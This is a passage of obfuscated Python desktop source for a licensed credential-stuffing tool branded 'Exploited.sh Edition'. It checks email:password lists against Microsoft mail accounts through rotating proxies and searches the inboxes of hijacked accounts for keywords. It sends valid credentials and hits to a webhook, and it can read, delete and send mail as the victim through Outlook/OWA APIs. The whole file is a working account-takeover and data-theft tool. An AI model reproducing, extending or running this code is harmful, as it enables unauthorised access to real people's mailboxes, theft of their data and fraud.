                lbl6.setPixmap(text)
                state = 341612
            elif state == 341612:
                lbl6.setAlignment(Qt.AlignmentFlag.AlignCenter)
                state = 688883
            elif state == 688883:
                item.addWidget(lbl6)
                state = 74862
            elif state == 74862:
                err_kw = QLabel(title)
                state = 759533
            elif state == 759533:
                err_kw.setObjectName('H2')
                state = 677684
            elif state == 677684:
                err_kw.setAlignment(Qt.AlignmentFlag.AlignCenter)
                state = 87065
            elif state == 87065:
                item.addWidget(err_kw)
                state = 522747
            elif state == 522747:
                if sub:
                    sock = QLabel(sub)
                    sock.setObjectName('Body')
                    sock.setAlignment(Qt.AlignmentFlag.AlignCenter)
                    sock.setWordWrap(True)
                    item.addWidget(sock)
                state = -1
            else:
                break

class LicenseWorker(QThread):
    result = pyqtSignal(bool, str)

    def __init__(self, key):
        state4 = 185408
        while True:
            if state4 == 185408:
                super().__init__()
                state4 = 556599
            elif state4 == 556599:
                state4 = 165931
            elif state4 == 165931:
                self.key = key
                state4 = -1
            else:
                break

    def run(self):
        state4 = 823209
        while True:
            if state4 == 823209:
                state4 = 607423
            elif state4 == 607423:
                ok, lic_msg, err = validate_license_wrapper(self.key)
                state4 = 577267
            elif state4 == 577267:
                self.result.emit(ok, err or '')
                state4 = -1
            else:
                break

class CheckerWorker(QThread):
    log = pyqtSignal(str, str, str)
    stats = pyqtSignal(dict)
    valid = pyqtSignal(dict)
    finished = pyqtSignal(dict)

    def __init__(self, accounts, search_q, threads, smtp_enabled, license_key='', site_kw_lower=None):
        state = 471461
        while True:
            if state == 471461:
                super().__init__()
                state = 787251
            elif state == 787251:
                self.accounts = accounts
                state = 898608
            elif state == 898608:
                self.search_q = search_q
                state = 414330
            elif state == 414330:
                self.threads = max(1, int(threads))
                state = 866913
            elif state == 866913:
                self.smtp_enabled = smtp_enabled
                state = 674152
            elif state == 674152:
                self.license_key = license_key
                state = 227156
            elif state == 227156:
                self.running = True
                state = 567522
            elif state == 567522:
                self.paused = False
                state = 438888
            elif state == 438888:
                self.executor = None
                state = 998105
            elif state == 998105:
                self.nv = self.nb = self.ne = self.nc = self.nad = 0
                state = 1045686
            elif state == 1045686:
                self.n_emails = self.n_hits = self.n_smtp = 0
                state = 67315
            elif state == 67315:
                self._domain_stats = {}
                state = 715608
            elif state == 715608:
                self.t_start = time.time()
                state = 762582
            elif state == 762582:
                self._site_kw_lower = set(site_kw_lower) if site_kw_lower else set()
                state = -1
            else:
                break

    def stop(self):
        self.running = False
        if self.executor:
            try:
                self.executor.shutdown(wait=False, cancel_futures=True)
            except Exception:
                pass

    def pause(self):
        self.paused = True

    def resume(self):
        self.paused = False

    def _emit_stats(self):
        self.stats.emit({'valid': self.nv, 'bad': self.nb, 'err': self.ne, 'denied': self.nad, 'checked': self.nc, 'emails': self.n_emails, 'hits': self.n_hits, 'smtp': self.n_smtp, 'total': len(self.accounts), 'elapsed': int(time.time() - self.t_start)})

    @staticmethod
    def _run_with_proxy(email, pw, search_q, smtp_on=True):
        pass
        _rand = __import__('random')
        proxy_url = load_proxies_alt()
        if proxy_url:
            set_thread_proxy(proxy_url)
            try:
                result = check_account(email, pw, search_q, smtp_enabled=smtp_on, proxy_url=proxy_url)
                status = result.get('status', '')
                message = (result.get('reason', '') or '').lower()
                if status == 'error':
                    if any((kw2 in message for kw2 in ('timeout', 'connection', 'network', 'proxy', 'socks', 'refused', 'unreachable', 'reset', 'broken pipe'))):
                        parse_proxy(proxy_url)
                        get_thread_proxy = load_proxies_alt()
                        if get_thread_proxy and get_thread_proxy != proxy_url:
                            try:
                                return check_account(email, pw, search_q, smtp_enabled=smtp_on, proxy_url=get_thread_proxy)
                            except Exception:
                                pass
                        return result
                elif status == 'valid':
                    format_proxy(proxy_url)
                return result
            except Exception as exc2:
                parse_proxy(proxy_url)
                get_thread_proxy = load_proxies_alt()
                if get_thread_proxy and get_thread_proxy != proxy_url:
                    try:
                        return check_account(email, pw, search_q, smtp_enabled=smtp_on, proxy_url=get_thread_proxy)
                    except Exception:
                        pass
                return build_result(email, pw, '?', 'error', str(exc2)[:60], None)
            finally:
                set_thread_proxy(None)
        else:
            try:
                return check_account(email, pw, search_q, smtp_enabled=smtp_on, proxy_url=None)
            except Exception as exc2:
                return build_result(email, pw, '?', 'error', str(exc2)[:60], None)

    def run(self):
        try:
            pool = _cf.ThreadPoolExecutor(max_workers=self.threads)
            self.executor = pool
            dict1 = {}
            pos = 0
            total = len(self.accounts)
            _10a_a90ee5 = max(self.threads * 2, 10)
            t0 = time.time()
            while (pos < total or dict1) and self.running:
                while self.paused and self.running:
                    time.sleep(0.1)
                if not self.running:
                    break
                while len(dict1) < _10a_a90ee5 and pos < total and self.running:
                    va = self.accounts[pos]
                    pos += 1
                    try:
                        email, pw = va.split(':', 1)
                    except Exception:
                        self.nc += 1
                        continue
                    try:
                        folder = pool.submit(self._run_with_proxy, email.strip(), pw.strip(), self.search_q, self.smtp_enabled)
                        dict1[folder] = email
                    except RuntimeError:
                        break
                if not dict1:
                    break
                _1cb_028695 = 0.05
                try:
                    done, reg_type = _cf.wait(list(dict1.keys()), timeout=_1cb_028695, return_when=_cf.FIRST_COMPLETED)
                except Exception:
                    break
                for folder in done:
                    dict1.pop(folder, None)
                    try:
                        resp = folder.result(timeout=2)
                        self._handle(resp)
                    except _cf.CancelledError:
                        pass
                    except Exception:
                        self.ne += 1
                    self.nc += 1
                now = time.time()
                if now - t0 > 0.15:
                    self._emit_stats()
                    t0 = now
            for folder in dict1:
                folder.cancel()
            pool.shutdown(wait=False, cancel_futures=True)
            self.executor = None
        except Exception:
            pass
        finally:
            self._emit_stats()
            self.finished.emit({'valid': self.nv, 'bad': self.nb, 'err': self.ne, 'denied': self.nad, 'hits': self.n_hits, 'smtp': self.n_smtp, 'elapsed': int(time.time() - self.t_start), 'domains': dict(self._domain_stats), 'run_folder': results_path.name})

    def _handle(self, resp):
        startup_resp = resp.get('status')
        email = resp.get('email', '?')
        info = resp.get('info', {})
        cid2 = resp.get('domain', '?')
        if startup_resp == 'valid':
            self.nv += 1
            if resp.get('smtp_ok'):
                self.n_smtp += 1
            _1a3_0457b6 = info.get('total', 0)
            kw_match = info.get('kw_match', 0)
            kw_details = info.get('kw_details', {})
            self.n_emails += _1a3_0457b6
            _15b_17eba2 = getattr(self, '_site_kw_lower', set())
            kw_copy = dict(kw_details)
            kw_map = {}
            for kw2, kw_info in kw_details.items():
                if kw2.lower() not in _15b_17eba2:
                    kw_map[kw2] = kw_info
            kw_n = len(kw_map)
            if kw_n:
                self.n_hits += kw_n
            self._domain_stats[cid2] = self._domain_stats.get(cid2, 0) + 1
            resp['info']['kw_details'] = kw_map
            resp['info']['kw_match'] = 1 if kw_map else 0
            save(resp)
            self.valid.emit(resp)
            _168_031db0 = ''
            _77_82942e = info.get('inbox', 0)
            total_n = info.get('total', 0)
            location = info.get('location', '?')
            _56_7ea567 = f"  🎯 {', '.join(kw_map.keys())}" if kw_map else ''
            if location == 'Unknown' and total_n == 0 and (not ms_token):
                location = 'Flagged'
            parts = f'✓ {email}  {location} | {total_n}msg{_56_7ea567}'
            self.log.emit(parts, 'v', 'valid')
            domain = f"{email}:{resp.get('pw', '?')}"
            stats_row = {'Emails': str(total_n)}
            if resp.get('smtp_ok'):
                stats_row['SMTP'] = '✓'
            send_webhook('valid', '✓ Valid', domain, stats_row)
            if resp.get('smtp_ok'):
                send_webhook('smtp', '📤 SMTP', domain, {'Host': f"{resp.get('sh', '')}:{resp.get('sp', '')}"})
            if kw_map:
                list4 = []
                hit_data = {}
                for kw2, kw_info in kw_map.items():
                    list4.append(f'{kw2} ({len(kw_info)})')
                    if kw_info:
                        hit_data['Subject'] = kw_info[0]['subject'][:60]
                        hit_data['Date'] = kw_info[0].get('date', '')[:20]
                hit_data['Keywords'] = ', '.join(list4)
                hit_data['Matches'] = str(sum((len(kw) for kw in kw_map.values())))
                hit_data['Emails'] = str(total_n)
                send_webhook('hit', '🎯 Hit Found', domain, hit_data)
        elif startup_resp == 'bad':
            self.nb += 1
            save(resp)
            self.log.emit(f'✗ {email}', 'b', 'bad')
        elif startup_resp == 'access_denied':
            self.nad += 1
            save(resp)
            self.log.emit(f'🔐 {email}  access denied', 'ad', 'denied')
        elif startup_resp == 'no_server':
            self.ne += 1
            self.log.emit(f'⚠ {email}  no server', 'e', 'error')
        else:
            self.ne += 1
            message = resp.get('reason', '?')
            self.log.emit(f'⚠ {email}  {message}', 'e', 'error')

class Worker1(QThread):
    pass
    done = pyqtSignal(list)
    err = pyqtSignal(str)

    def __init__(self, account):
        state4 = 1004346
        while True:
            if state4 == 1004346:
                super().__init__()
                state4 = 996510
            elif state4 == 996510:
                state4 = 413403
            elif state4 == 413403:
                self.account = account
                state4 = -1
            else:
                break

    def run(self):
        try:
            email = self.account['email']
            token = self.account.get('info', {}).get('token') or self.account.get('token')
            cid = self.account.get('info', {}).get('cid') or self.account.get('cid')
            pw = self.account.get('pw', '') or self.account.get('password', '')
            if not token or not cid:
                token, cid, err = oauth_login(email, pw)
                if not token:
                    self.err.emit(f'Re-auth failed: {err}')
                    return
            folder_names = {'inbox': 'Inbox', 'sentitems': 'Sent Items', 'drafts': 'Drafts', 'deleteditems': 'Deleted Items', 'junkemail': 'Junk Email'}
            folders = get_folders(email, token, cid)
            if not folders and pw:
                token, cid, err = oauth_login(email, pw)
                if token:
                    if 'info' in self.account:
                        self.account['info']['token'] = token
                        self.account['info']['cid'] = cid
                    folders = get_folders(email, token, cid)
            result = []
            for folder in folders or []:
                name = folder.get('DisplayName', '') or folder_names.get(folder.get('FolderId', {}).get('Id', '').lower(), 'Folder')
                total = folder.get('TotalCount', 0)
                unread = folder.get('UnreadCount', 0)
                if unread:
                    result.append(f'{name} ({unread}/{total})')
                else:
                    result.append(f'{name} [{total}]')
            if not result:
                result = list(folder_names.values())
            self.done.emit(result)
        except Exception as exc2:
            self.err.emit(str(exc2))

class Worker2(QThread):
    pass
    done = pyqtSignal(list, int, str)
    err = pyqtSignal(str, str)

    def __init__(self, account, folder, limit=50, search_q=None):
        state = 635888
        while True:
            if state == 635888:
                super().__init__()
                state = 985044
            elif state == 985044:
                self.account = account
                state = 154690
            elif state == 154690:
                self.folder = folder
                state = 795506
            elif state == 795506:
                self.limit = limit
                state = 946977
            elif state == 946977:
                self.search_q = search_q
                state = -1
            else:
                break

    def run(self):
        try:
            email = self.account['email']
            token = self.account.get('info', {}).get('token') or self.account.get('token')
            cid = self.account.get('info', {}).get('cid') or self.account.get('cid')
            pw = self.account.get('pw', '') or self.account.get('password', '')
            if not token or not cid:
                token, cid, err = oauth_login(email, pw)
                if not token:
                    self.err.emit(f'Re-auth failed: {err}', self.folder)
                    return
                if 'info' in self.account:
                    self.account['info']['token'] = token
                    self.account['info']['cid'] = cid
            query = self.search_q or '*'
            search_id = str(uuid.uuid4())
            payload = {'Cvid': search_id, 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'UTC', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Message', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': query}, 'Size': self.limit, 'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}]}], 'LogicalId': search_id}
            _rq = __import__('requests')
            session = _rq.Session()
            search_resp = session.post('https://substrate.office.com/search/api/v2/query', headers={'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}, json=payload, timeout=15)
            extra = []
            total = 0
            if search_resp.status_code == 200:
                try:
                    data = search_resp.json()
                    result_set = data.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0]
                    total = result_set.get('Total', 0)
                    for result_item in result_set.get('Results', []):
                        source = result_item.get('Source', {})
                        from_name = source.get('SenderName', '') or source.get('From', '')
                        from_email = source.get('SenderEmailAddress', '')
                        item_id = source.get('ItemId', '')
                        if isinstance(item_id, dict):
                            item_id = item_id.get('Id', '')
                        else:
                            item_id = str(item_id) if item_id else ''
                        extra.append({'Id': item_id, 'ChangeKey': '', 'subject': source.get('Subject', source.get('Topic', '(No Subject)')), 'date': source.get('DateTimeReceived', source.get('Time', '')), 'read': True, 'has_attachments': False, 'preview': source.get('Preview', source.get('BodyPreview', '')), 'from': f'{from_name} <{from_email}>' if from_email else from_name, 'from_name': from_name, 'from_addr': from_email})
                except Exception:
                    pass
            self.done.emit(extra, total, self.folder)
        except Exception as exc2:
            self.err.emit(str(exc2), self.folder)

class Worker3(QThread):
    pass
    done = pyqtSignal(object, object)
    err = pyqtSignal(str, object)

    def __init__(self, account, item_id, folder):
        state = 451635
        while True:
            if state == 451635:
                super().__init__()
                state = 128848
            elif state == 128848:
                self.account = account
                state = 521914
            elif state == 521914:
                self.item_id = item_id
                state = 993753
            elif state == 993753:
                self.folder = folder
                state = -1
            else:
                break

    def run(self):
        try:
            email = self.account['email']
            token = self.account.get('info', {}).get('token') or self.account.get('token')
            cid = self.account.get('info', {}).get('cid') or self.account.get('cid')
            pw = self.account.get('pw', '') or self.account.get('password', '')
            if not token or not cid:
                if pw:
                    token, cid, err = oauth_login(email, pw)
                    if token and 'info' in self.account:
                        self.account['info']['token'] = token
                        self.account['info']['cid'] = cid
                if not token:
                    self.done.emit({'body': '<p>(Could not authenticate to fetch body)</p>'}, str(self.item_id))
                    return
            _rq = __import__('requests')
            session = _rq.Session()
            search_id = str(uuid.uuid4())
            payload = {'Cvid': search_id, 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'UTC', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Message', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': '*'}, 'Size': 50, 'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}]}], 'LogicalId': search_id}
            search_resp = session.post('https://substrate.office.com/search/api/v2/query', headers={'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}, json=payload, timeout=15)
            body = '<p>(Could not fetch email body)</p>'
            subject = ''
            from_mailbox = ''
            body2 = ''
            str2 = ''
            if search_resp.status_code == 200:
                try:
                    data = search_resp.json()
                    results_list = data.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Results', [])
                    for result_item in results_list:
                        source = result_item.get('Source', {})
                        item_id = source.get('ItemId', '')
                        if isinstance(item_id, dict):
                            item_id = item_id.get('Id', '')
                        else:
                            item_id = str(item_id) if item_id else ''
                        if item_id == str(self.item_id):
                            str2 = source.get('Preview', source.get('BodyPreview', ''))
                            subject = source.get('Subject', source.get('Topic', ''))
                            from_mailbox = source.get('SenderName', '') or source.get('From', '')
                            body2 = source.get('DateTimeReceived', source.get('Time', ''))
                            break
                    else:
                        if results_list:
                            source = results_list[0].get('Source', {})
                            str2 = source.get('Preview', source.get('BodyPreview', ''))
                            subject = source.get('Subject', source.get('Topic', ''))
                            from_mailbox = source.get('SenderName', '') or source.get('From', '')
                            body2 = source.get('DateTimeReceived', source.get('Time', ''))
                except Exception:
                    pass
            val2 = None
            if token and str(self.item_id):
                try:
                    _86_dbbd45 = {'__type': 'GetItemJsonRequest:#Exchange', 'Header': make_session(), 'Body': {'__type': 'GetItemRequest:#Exchange', 'ItemShape': {'__type': 'ItemResponseShape:#Exchange', 'BaseShape': 'Default', 'BodyType': 'HTML', 'UniqueBodyType': 'HTML', 'FilterHtmlContent': True, 'MaximumBodySize': 2097152}, 'ItemIds': [{'__type': 'ItemId:#Exchange', 'Id': str(self.item_id)}]}}
                    getitem_resp = session.post(owa_url(email, 'GetItem'), headers=owa_headers(token, cid, 'GetItem'), json=_86_dbbd45, timeout=15)
                    if getitem_resp.status_code == 200:
                        try:
                            getitem_json = getitem_resp.json()
                            getitem_item = getitem_json.get('Body', {}).get('ResponseMessages', {}).get('Items', [{}])[0]
                            if getitem_item.get('ResponseClass') == 'Success':
                                getitem_items = getitem_item.get('Items', [])
                                if getitem_items:
                                    msg = getitem_items[0]
                                    for body_key in ['Body', 'UniqueBody', 'NormalizedBody']:
                                        body_obj = msg.get(body_key, {})
                                        if isinstance(body_obj, dict) and body_obj.get('Value'):
                                            val2 = body_obj['Value']
                                            break
                                    if not val2:
                                        mime_b64 = msg.get('MimeContent', {}).get('Value', '')
                                        if mime_b64:
                                            _b64 = __import__('base64')
                                            _email_lib = __import__('email')
                                            mime_bytes = _b64.b64decode(mime_b64)
                                            mime_msg = _email_lib.message_from_bytes(mime_bytes)
                                            if mime_msg.is_multipart():
                                                for part in mime_msg.walk():
                                                    if part.get_content_type() == 'text/html':
                                                        proxy3 = part.get_payload(decode=True)
                                                        if proxy3:
                                                            val2 = proxy3.decode(errors='replace')
                                                            break
                                            else:
                                                proxy3 = mime_msg.get_payload(decode=True)
                                                if proxy3:
                                                    val2 = proxy3.decode(errors='replace')
                        except Exception:
                            pass
                except Exception:
                    pass
            if not val2 and token and str(self.item_id):
                try:
                    msg_resp = session.get(f'https://outlook.live.com/api/v2.0/me/messages/{str(self.item_id)}?$select=Subject,From,ToRecipients,ReceivedDateTime,Body,HasAttachments', headers={'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}, timeout=15)
                    if msg_resp.status_code == 200:
                        try:
                            msg_json = msg_resp.json()
                            body_obj2 = msg_json.get('Body', {})
                            if isinstance(body_obj2, dict) and body_obj2.get('Content'):
                                val2 = body_obj2['Content']
                            if not subject:
                                subject = msg_json.get('Subject', '')
                            if not from_mailbox:
                                from_email_obj = msg_json.get('From', {}).get('EmailAddress', {})
                                from_mailbox = f"{from_email_obj.get('Name', '')} <{from_email_obj.get('Address', '')}>"
                            if not body2:
                                body2 = msg_json.get('ReceivedDateTime', '')
                        except Exception:
                            pass
                except Exception:
                    pass
            html_mod = __import__('html')
            if val2:
                body = f"""\n                <div style="padding: 20px; font-family: Segoe UI, Arial, sans-serif; font-size: 14px; line-height: 1.6;">\n                    <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #36364e;">\n                        <h2 style="margin: 0 0 8px 0; color: #e8e8f5; font-size: 18px;">{html_mod.escape(subject or '(No Subject)')}</h2>\n                        <div style="color: #a0a0c0; font-size: 12px;">\n                            <span><b style="color: #60a5fa;">From:</b> {html_mod.escape(from_mailbox or 'Unknown')}</span><br/>\n                            <span><b style="color: #60a5fa;">Date:</b> {html_mod.escape(body2 or '')}</span>\n                        </div>\n                    </div>\n                    <div style="color: #e8e8f5;">{val2}</div>\n                </div>\n                """
            elif str2:
                _cd_da0e23 = html_mod.escape(str2).replace('\n', '<br/>')
                body = f"""\n                <div style="padding: 20px; font-family: Segoe UI, Arial, sans-serif; font-size: 14px; line-height: 1.6;">\n                    <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #36364e;">\n                        <h2 style="margin: 0 0 8px 0; color: #e8e8f5; font-size: 18px;">{html_mod.escape(subject or '(No Subject)')}</h2>\n                        <div style="color: #a0a0c0; font-size: 12px;">\n                            <span><b style="color: #60a5fa;">From:</b> {html_mod.escape(from_mailbox or 'Unknown')}</span><br/>\n                            <span><b style="color: #60a5fa;">Date:</b> {html_mod.escape(body2 or '')}</span>\n                        </div>\n                    </div>\n                    <div style="color: #a0a0c0; font-style: italic; font-size: 12px; margin-bottom: 8px;">Preview (full body not available):</div>\n                    <div style="color: #e8e8f5; white-space: pre-wrap;">{_cd_da0e23}</div>\n                </div>\n                """
            self.done.emit({'body': body}, str(self.item_id))
        except Exception as exc2:
            self.err.emit(str(exc2), str(self.folder))

class Worker4(QThread):
    pass
    done = pyqtSignal(bool, str)
    err = pyqtSignal(str, str)

    def __init__(self, account, msg_id, folder, change_key=''):
        state = 733332
        while True:
            if state == 733332:
                super().__init__()
                state = 937150
            elif state == 937150:
                self.account = account
                state = 701099
            elif state == 701099:
                self.msg_id = msg_id
                state = 960753
            elif state == 960753:
                self.folder = folder
                state = 807853
            elif state == 807853:
                self.change_key = change_key
                state = -1
            else:
                break

    def run(self):
        try:
            email = self.account['email']
            token = self.account.get('info', {}).get('token') or self.account.get('token')
            cid = self.account.get('info', {}).get('cid') or self.account.get('cid')
            pw = self.account.get('pw', '') or self.account.get('password', '')
            if not token or not cid:
                token, cid, err = oauth_login(email, pw)
                if not token:
                    self.err.emit(f'Re-auth failed: {err}', self.folder)
                    return
            ok, html_msg = delete_item(email, self.msg_id, token, cid, change_key=self.change_key)
            self.done.emit(ok, html_msg)
        except Exception as exc2:
            self.err.emit(str(exc2), self.folder)

class Worker5(QThread):
    pass
    done = pyqtSignal(bool, str)

    def __init__(self, account, to, subject, body, reply_to_id=None, html=False, high_priority=False):
        state = 1020885
        while True:
            if state == 1020885:
                super().__init__()
                state = 467996
            elif state == 467996:
                self.account = account
                state = 923701
            elif state == 923701:
                self.to = to
                state = 269539
            elif state == 269539:
                self.subject = subject
                state = 442708
            elif state == 442708:
                self.body = body
                state = 683195
            elif state == 683195:
                self.reply_to_id = reply_to_id
                state = 901623
            elif state == 901623:
                self.html = html
                state = 500313
            elif state == 500313:
                self.high_priority = high_priority
                state = -1
            else:
                break

    def run(self):
        try:
            email = self.account['email']
            token = self.account.get('info', {}).get('token') or self.account.get('token')
            cid = self.account.get('info', {}).get('cid') or self.account.get('cid')
            pw = self.account.get('pw', '') or self.account.get('password', '')
            if not token or not cid:
                token, cid, err = oauth_login(email, pw)
                if not token:
                    self.done.emit(False, f'Re-auth failed: {err}')
                    return
            to_email = []
            for rcpt in self.to.split(','):
                rcpt = rcpt.strip()
                if not rcpt:
                    continue
                rcpt_m = re.search('<([^>]+)>', rcpt)
                if rcpt_m:
                    to_email.append(rcpt_m.group(1).strip())
                elif '@' in rcpt:
                    to_email.append(rcpt)
            if not to_email:
                self.done.emit(False, 'No valid email recipients (need @ symbol)')
                return
            _html = __import__('html')
            if self.html:
                body = self.body
            else:
                body = f'<pre>{_html.escape(self.body)}</pre>'
            ok, html_msg = create_item(email, token, cid, to_email, self.subject, body)
            self.done.emit(ok, html_msg)
        except Exception as exc2:
            self.done.emit(False, str(exc2)[:80])

class LicenseDialog(QDialog):
    success = pyqtSignal(str)

    def __init__(self, parent=None):
        state = 903304
        while True:
            if state == 903304:
                super().__init__(parent)
                state = 95561
            elif state == 95561:
                self.setWindowTitle(f'{app_name} — Activation')
                state = 211359
            elif state == 211359:
                self.setModal(True)
                state = 563337
            elif state == 563337:
                self.setFixedSize(480, 560)
                state = 1041727
            elif state == 1041727:
                self.setWindowFlags(Qt.WindowType.Dialog | Qt.WindowType.FramelessWindowHint)
                state = 791121
            elif state == 791121:
                self._worker = None
                state = 148447
            elif state == 148447:
                self._build()
                state = 309533
            elif state == 309533:
                sh = QGraphicsDropShadowEffect(self)
                state = 1000202
            elif state == 1000202:
                sh.setBlurRadius(40)
                state = 77109
            elif state == 77109:
                sh.setColor(QColor(0, 0, 0, 180))
                state = 790727
            elif state == 790727:
                sh.setOffset(0, 10)
                state = 193443
            elif state == 193443:
                self.setGraphicsEffect(sh)
                state = -1
            else:
                break

    def _build(self):
        vbox5 = QVBoxLayout(self)
        vbox5.setContentsMargins(1, 1, 1, 1)
        frame3 = QFrame()
        frame3.setStyleSheet(f'.QFrame {{ background: {Colors.BG_ELEVATED}; border-radius: {Colors.R_XL}px; border: 1px solid {Colors.BORDER}; }}')
        vbox5.addWidget(frame3)
        item = QVBoxLayout(frame3)
        item.setContentsMargins(Colors.SP_2XL, Colors.SP_2XL, Colors.SP_2XL, Colors.SP_XL)
        item.setSpacing(Colors.SP_MD)
        frame7 = QFrame()
        frame7.setFixedHeight(3)
        frame7.setStyleSheet(f'background: {Colors.ACCENT}; border-radius: 1px;')
        item.addWidget(frame7)
        item.addSpacing(Colors.SP_LG)
        hbox11 = QHBoxLayout()
        hbox11.addStretch(1)
        lbl2 = QLabel()
        lbl2.setPixmap(make_icon_alt(72))
        lbl2.setAlignment(Qt.AlignmentFlag.AlignCenter)
        hbox11.addWidget(lbl2)
        hbox11.addStretch(1)
        item.addLayout(hbox11)
        item.addSpacing(Colors.SP_MD)
        title = QLabel(app_name)
        title.setObjectName('Hero')
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        item.addWidget(title)
        sub = QLabel(f'v{version}  ·  Exploited.sh Edition')
        sub.setObjectName('Caption')
        sub.setAlignment(Qt.AlignmentFlag.AlignCenter)
        item.addWidget(sub)
        item.addSpacing(Colors.SP_XL)
        lbl4 = QLabel('Enter your license key to activate the application')
        lbl4.setObjectName('Body')
        lbl4.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lbl4.setWordWrap(True)
        item.addWidget(lbl4)
        item.addSpacing(Colors.SP_LG)
        parent_w3 = QFrame()
        parent_w3.setStyleSheet(f'.QFrame {{ background: {Colors.BG}; border: 1px solid {Colors.BORDER}; border-radius: {Colors.R_MD}px; }}')
        hbox12 = QHBoxLayout(parent_w3)
        hbox12.setContentsMargins(Colors.SP_MD, 0, 0, 0)
        hbox12.setSpacing(Colors.SP_SM)
        lbl9 = QLabel()
        lbl9.setPixmap(SettingsDialog.key(16, Colors.TEXT_MUTED))
        hbox12.addWidget(lbl9)
        self.key_entry = QLineEdit()
        self.key_entry.setPlaceholderText('XXXX-XXXX-XXXX-XXXX-XXXX')
        self.key_entry.setStyleSheet(f'background: transparent; border: none; padding: 12px 8px; font-size: {Colors.FS_LG}px; font-family: {Colors.FONT_MONO};')
        self.key_entry.returnPressed.connect(self._activate)
        hbox12.addWidget(self.key_entry)
        item.addWidget(parent_w3)
        self.status_lbl = QLabel(' ')
        self.status_lbl.setObjectName('Body')
        self.status_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_lbl.setWordWrap(True)
        item.addWidget(self.status_lbl)
        item.addSpacing(Colors.SP_LG)
        hbox13 = QHBoxLayout()
        hbox13.addStretch(1)
        self.activate_btn = QPushButton('Activate License')
        self.activate_btn.setObjectName('Primary')
        self.activate_btn.setMinimumWidth(180)
        self.activate_btn.setMinimumHeight(40)
        self.activate_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.activate_btn.clicked.connect(lambda: self._activate())
        hbox13.addWidget(self.activate_btn)
        hbox13.addStretch(1)
        item.addLayout(hbox13)
        item.addStretch(1)
        frame8 = QFrame()
        frame8.setStyleSheet(f'.QFrame {{ background: {Colors.BG}; border-radius: {Colors.R_MD}px; }}')
        vbox = QVBoxLayout(frame8)
        vbox.setContentsMargins(Colors.SP_MD, Colors.SP_SM, Colors.SP_MD, Colors.SP_SM)
        vbox.setSpacing(2)
        hbox14 = QHBoxLayout()
        lbl10 = QLabel('Device')
        lbl10.setObjectName('Caption')
        hbox14.addWidget(lbl10)
        hbox14.addStretch(1)
        lbl11 = QLabel(friendly_name())
        lbl11.setStyleSheet(f'color: {Colors.TEXT}; font-size: {Colors.FS_BODY}px; font-weight: {Colors.FW_SEMI};')
        hbox14.addWidget(lbl11)
        vbox.addLayout(hbox14)
        hbox15 = QHBoxLayout()
        lbl12 = QLabel('IP')
        lbl12.setObjectName('Caption')
        hbox15.addWidget(lbl12)
        hbox15.addStretch(1)
        lbl7 = QLabel('Detecting…')
        lbl7.setStyleSheet(f'font-family: {Colors.FONT_MONO}; color: {Colors.TEXT_SOFT}; font-size: {Colors.FS_CAPTION}px;')
        hbox15.addWidget(lbl7)
        vbox.addLayout(hbox15)
        hbox16 = QHBoxLayout()
        lbl13 = QLabel('Fingerprint')
        lbl13.setObjectName('Caption')
        hbox16.addWidget(lbl13)
        hbox16.addStretch(1)
        lbl5 = QLabel(device_id[:16] + '…')
        lbl5.setStyleSheet(f'font-family: {Colors.FONT_MONO}; color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px;')
        lbl5.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        lbl5.setToolTip(device_id)
        hbox16.addWidget(lbl5)
        vbox.addLayout(hbox16)
        item.addWidget(frame8)

        def _detect_ip_async():

            class DetectWorker(QThread):
                done = pyqtSignal(str, str)

                def run(lic_key):
                    try:
                        info = get_public_ip()
                        extra3 = info.get('ip', 'Unknown')
                        country = info.get('country', '')
                        region_code = info.get('country_code', '')
                        text = extra3
                        if country:
                            text += f'  ·  {country}'
                        if region_code:
                            text += f' ({region_code})'
                        lic_key.done.emit(text, extra3)
                    except Exception:
                        lic_key.done.emit('Unknown', '')
            self._ip_worker = DetectWorker()

            def _on_ip(text, extra3):
                state3 = 562887
                while True:
                    if state3 == 562887:
                        state3 = 219814
                    elif state3 == 219814:
                        state3 = 835317
                    elif state3 == 835317:
                        lbl7.setText(text)
                        state3 = -1
                    else:
                        break
            self._ip_worker.done.connect(_on_ip)
            self._ip_worker.start()
        QTimer.singleShot(300, _detect_ip_async)
        btn2 = QPushButton('×', frame3)
        btn2.setObjectName('Icon')
        btn2.setFixedSize(32, 32)
        btn2.setStyleSheet(f'QPushButton {{ background: transparent; border: none; color: {Colors.TEXT_MUTED}; font-size: 20px; font-weight: bold; }} QPushButton:hover {{ color: {Colors.TEXT}; background: {Colors.SURFACE}; border-radius: {Colors.R_MD}px; }}')
        btn2.clicked.connect(lambda: self.reject())
        btn2.move(self.width() - 40, 8)
        QTimer.singleShot(150, self._try_saved_key)

    def _try_saved_key(self):
        state4 = 475930
        while True:
            if state4 == 475930:
                saved_key = get_cached_key()
                state4 = 461066
